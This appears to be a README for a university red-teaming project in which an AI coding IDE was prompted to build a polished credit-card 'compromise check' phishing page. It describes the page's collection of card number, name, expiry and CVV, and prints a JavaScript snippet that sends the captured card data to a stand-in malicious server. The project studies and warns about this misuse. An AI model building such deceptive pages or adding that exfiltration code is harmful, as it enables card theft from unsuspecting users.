# CardShield: A Red Teaming AI Security Experiment

![Project Banner](https://img.shields.io/badge/Cornell%20Tech-Red%20Team%20Experiment-red)
![Status](https://img.shields.io/badge/Status-Educational%20Only-blue)
![License](https://img.shields.io/badge/License-MIT-green)

## Overview

This project was developed as part of the Cornell Tech Red Teaming course to assess the emerging security risks associated with AI-powered development tools. Specifically, we tested whether Cursor (an AI-powered IDE using Claude's 3.7 Sonnet model) could generate a legitimate-looking website designed to harvest sensitive financial information.

**IMPORTANT**: This project is for **educational purposes only**. The code in this repository should not be deployed in production or used to collect actual credit card information.

## Experiment Results

Our hypothesis was validated within minutes. **Within 2 minutes.** The AI was able to rapidly generate a professional, modern-looking website with:

- A convincing security-focused narrative (checking if a card has been "compromised")
- Complete credit card data collection (16-digit card number, cardholder name, expiry date, CVV)
- Sophisticated UI with interactive 3D card flipping
- Form validation for all credit card fields
- Realistic loading animations and "scanning" sequences
- Professional design elements (gradient text, responsive layout, custom animations)

The resulting site is visually indistinguishable from legitimate FinTech products, lending it immediate credibility to potential users. The entire implementation took less than 5 minutes from prompt to complete code generation.

## Technical Implementation

The application was created using vanilla web technologies:

- **HTML5** for structure
- **CSS3** for styling (with custom animations and 3D transformations)
- **JavaScript** for interactive elements and validation

Key features include:

1. **Interactive 3D Credit Card**: The card visually flips to show both front and back sides, with dedicated inputs for each field
2. **Multi-step User Flow**: Initial card entry → Scanning animation → Success message
3. **Field Validation**: Real-time validation for card number format, expiry dates, and CVV
4. **Auto-advancing Inputs**: Automatically focuses the next field when current input is complete
5. **Simulated "Security Scan"**: Animated loading sequence with progress indicators

## Security Implications

The ease and speed with which this convincing interface was generated raises several security concerns:

1. **Low Barrier to Entry**: Malicious actors no longer need extensive frontend development skills to create convincing phishing sites
2. **High Level of Polish**: The professional appearance makes the site immediately credible to average users
3. **Quick Iteration**: Such tools allow for rapid refinement based on user feedback
4. **Customizability**: The codebase can be easily modified to change branding, messaging, or functionality

For example, a malicious actor could trivially modify the `scanButton` event listener in `script.js` to send captured card data to an external server before showing the success animation:

```javascript
scanButton.addEventListener('click', function() {
    // Validation code...
    
    // This could be added to exfiltrate the data
    fetch('https://malicious-server.com/collect', {
        method: 'POST',
        body: JSON.stringify({
            cardNumber: `${cardNumber1}${cardNumber2}${cardNumber3}${cardNumber4}`,
            cardHolder: cardHolder,
            cardExpiry: `${cardMonth}/${cardYear}`,
            cardCvc: cardCvc
        })
    });
    
    // Continue with the original flow...
    changeState(initialState, loadingState);
    simulateScanning();
});
```

## Ethical Considerations

This project highlights the dual-use nature of powerful AI tools. The same capabilities that enable rapid prototyping and development for legitimate businesses also lower barriers for creating deceptive interfaces.

We believe that openly discussing these capabilities is crucial for:

1. **Raising awareness** among security professionals and the public
2. **Encouraging responsible AI development** that considers potential misuse
3. **Promoting stronger authentication systems** that go beyond visual trust signals
4. **Advancing discussions** around appropriate guardrails for AI-assisted coding

## Defensive Recommendations

Based on this experiment, we recommend:

- **For Users**: Be skeptical of websites requesting financial information, even when they look professional. Verify the domain and use official apps when possible.
- **For Developers**: Implement robust CSP policies, SRI checks, and consider how design elements might be co-opted.
- **For Platforms**: Consider how to detect and mitigate potentially deceptive interfaces created through AI tools.
- **For Educators**: Include AI-generated content in security training scenarios.

## Running the Project

To explore this project locally:

1. Clone the repository
2. Open `index.html` in a modern web browser
3. Interact with the interface to understand its flow

No server-side code or dependencies are required as this is a client-side only implementation.

## Conclusion

This experiment demonstrates that AI models can now generate sophisticated, deceptive web interfaces with minimal human guidance. As these tools become more accessible, the security community must adapt its defensive strategies and educate users about emerging risks.

The project serves as a call for proactive measures in the rapidly evolving landscape of AI-assisted development, where the technical barriers to creating convincing fraudulent interfaces are rapidly diminishing.

## License

This project is available under the MIT License for educational purposes only.